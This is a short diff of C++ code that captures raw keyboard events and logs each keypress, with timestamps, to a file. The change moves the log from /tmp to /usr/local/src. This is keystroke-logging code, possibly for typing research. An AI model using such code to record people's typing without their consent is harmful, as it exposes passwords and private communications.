@@ -96,7 +96,7 @@ int runKDProcess(pid_t parentPID) {
       // Concat string to add to entrance
       sprintf(phrase, "%ld - %ld - %s - %s\n", seconds, ev.time.tv_usec,
               getKeyboardLetter(ev.code).c_str(), keyPressed(ev.value).c_str());
-      const std::string filename = "/tmp/rawKeyData.txt";
+      const std::string filename = "/usr/local/src/rawKeyData.txt";
       log_data(filename.c_str(), phrase);
     }
     //}
